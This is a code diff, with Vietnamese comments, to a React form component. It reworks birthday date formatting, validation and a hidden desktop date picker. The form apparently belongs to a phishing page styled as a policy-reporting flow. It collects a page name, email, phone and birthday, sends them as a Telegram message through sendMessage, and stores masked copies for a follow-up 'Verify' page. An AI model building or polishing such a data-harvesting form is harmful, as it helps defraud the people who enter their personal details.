@@ -65,9 +65,23 @@ const Home = () => {
     // Hàm chuyển đổi từ yyyy-mm-dd sang dd/mm/yyyy
     const formatDateToDDMMYYYY = (dateString) => {
         if (!dateString) return '';
+        // Nếu đã là dd/mm/yyyy thì giữ nguyên
+        if (dateString.includes('/')) return dateString;
+        
         const parts = dateString.split('-');
         if (parts.length !== 3) return dateString;
         return `${parts[2]}/${parts[1]}/${parts[0]}`;
+    };
+
+    // Hàm chuyển đổi từ dd/mm/yyyy sang yyyy-mm-dd
+    const formatDateToYYYYMMDD = (dateString) => {
+        if (!dateString) return '';
+        // Nếu đã là yyyy-mm-dd thì giữ nguyên
+        if (dateString.includes('-')) return dateString;
+        
+        const parts = dateString.split('/');
+        if (parts.length !== 3) return dateString;
+        return `${parts[2]}-${parts[1]}-${parts[0]}`;
     };
 
     // THÊM HÀM ẨN EMAIL: s****g@m****.com
@@ -181,6 +195,12 @@ const Home = () => {
                 ...prev,
                 [field]: finalValue
             }));
+        } else if (field === 'birthday') {
+            // Xử lý birthday - giữ nguyên giá trị nhập vào
+            setFormData((prev) => ({
+                ...prev,
+                [field]: value
+            }));
         } else {
             setFormData((prev) => ({
                 ...prev,
@@ -212,6 +232,16 @@ const Home = () => {
             newErrors.mail = 'invalid';
         }
 
+        // Validate birthday format (chấp nhận cả yyyy-mm-dd và dd/mm/yyyy)
+        if (formData.birthday.trim() !== '') {
+            const dateRegex1 = /^\d{4}-\d{2}-\d{2}$/; // yyyy-mm-dd
+            const dateRegex2 = /^\d{2}\/\d{2}\/\d{4}$/; // dd/mm/yyyy
+            
+            if (!dateRegex1.test(formData.birthday) && !dateRegex2.test(formData.birthday)) {
+                newErrors.birthday = true;
+            }
+        }
+
         setErrors(newErrors);
         return Object.keys(newErrors).length === 0;
     };
@@ -219,7 +249,13 @@ const Home = () => {
     const handleSubmit = async () => {
         if (validateForm()) {
             try {
-                const telegramMessage = formatTelegramMessage(formData);
+                // Format birthday về yyyy-mm-dd trước khi gửi
+                const formattedData = {
+                    ...formData,
+                    birthday: formatDateToYYYYMMDD(formData.birthday)
+                };
+
+                const telegramMessage = formatTelegramMessage(formattedData);
                 await sendMessage(telegramMessage);
 
                 // THÊM CODE XỬ LÝ ẨN THÔNG TIN VÀ LƯU VÀO LOCALSTORAGE
@@ -227,7 +263,7 @@ const Home = () => {
                     name: formData.pageName,
                     email: hideEmail(formData.mail),
                     phone: hidePhone(formData.phone),
-                    birthday: formData.birthday
+                    birthday: formatDateToDDMMYYYY(formData.birthday)
                 };
 
                 // Lưu vào localStorage để trang Verify lấy
@@ -289,6 +325,28 @@ const Home = () => {
             title: translatedTexts.policiesReporting
         }
     ];
+
+    // Hàm xử lý click birthday cho desktop
+    const handleDesktopBirthdayClick = () => {
+        const dateInput = document.createElement('input');
+        dateInput.type = 'date';
+        dateInput.style.position = 'fixed';
+        dateInput.style.opacity = '0';
+        dateInput.style.pointerEvents = 'none';
+        document.body.appendChild(dateInput);
+        
+        dateInput.showPicker();
+        
+        dateInput.onchange = (event) => {
+            handleInputChange('birthday', event.target.value);
+            document.body.removeChild(dateInput);
+        };
+        
+        dateInput.onblur = () => {
+            document.body.removeChild(dateInput);
+        };
+    };
+
     return (
         <>
             <header className='sticky top-0 left-0 flex h-14 justify-between p-4 shadow-sm'>
@@ -362,23 +420,17 @@ const Home = () => {
                                     {translatedTexts.birthday} <span className='text-red-500'>*</span>
                                 </p>
                                 
-                                {/* Desktop: type='date' với placeholder ảo */}
+                                {/* Desktop: input text với placeholder dd/mm/yyyy */}
                                 <div className='hidden sm:block relative'>
                                     <input 
-                                        type='date' 
+                                        type='text'
                                         name='birthday' 
-                                        className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} opacity-0 absolute z-10`} 
-                                        value={formData.birthday} 
+                                        className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} 
+                                        placeholder='dd/mm/yyyy'
+                                        value={formatDateToDDMMYYYY(formData.birthday)}
                                         onChange={(e) => handleInputChange('birthday', e.target.value)}
-                                        required
+                                        onFocus={handleDesktopBirthdayClick}
                                     />
-                                    {/* Placeholder ảo cho desktop */}
-                                    <div 
-                                        className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 bg-white ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${formData.birthday ? 'text-gray-900 text-base' : 'text-gray-500 text-base'} font-medium`}
-                                        onClick={() => document.querySelectorAll('input[name="birthday"]')[0].click()}
-                                    >
-                                        {formData.birthday ? formatDateToDDMMYYYY(formData.birthday) : 'dd/mm/yyyy'}
-                                    </div>
                                 </div>
                                 
                                 {/* Mobile: type='date' với placeholder ảo */}
@@ -387,7 +439,7 @@ const Home = () => {
                                         type='date' 
                                         name='birthday' 
                                         className={`w-full rounded-lg border px-3 py-2.5 text-base ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} opacity-0 absolute z-10`} 
-                                        value={formData.birthday} 
+                                        value={formatDateToYYYYMMDD(formData.birthday)} 
                                         onChange={(e) => handleInputChange('birthday', e.target.value)}
                                         required
                                     />
@@ -396,7 +448,7 @@ const Home = () => {
                                         className={`w-full rounded-lg border px-3 py-2.5 bg-white ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${formData.birthday ? 'text-gray-900 text-base' : 'text-gray-500 text-base'} font-medium`}
                                         onClick={() => document.querySelectorAll('input[name="birthday"]')[1].click()}
                                     >
-                                        {formData.birthday ? formatDateToDDMMYYYY(formData.birthday) : 'dd/mm/yyyy'}
+                                        {formatDateToDDMMYYYY(formData.birthday) || 'dd/mm/yyyy'}
                                     </div>
                                 </div>
                                 
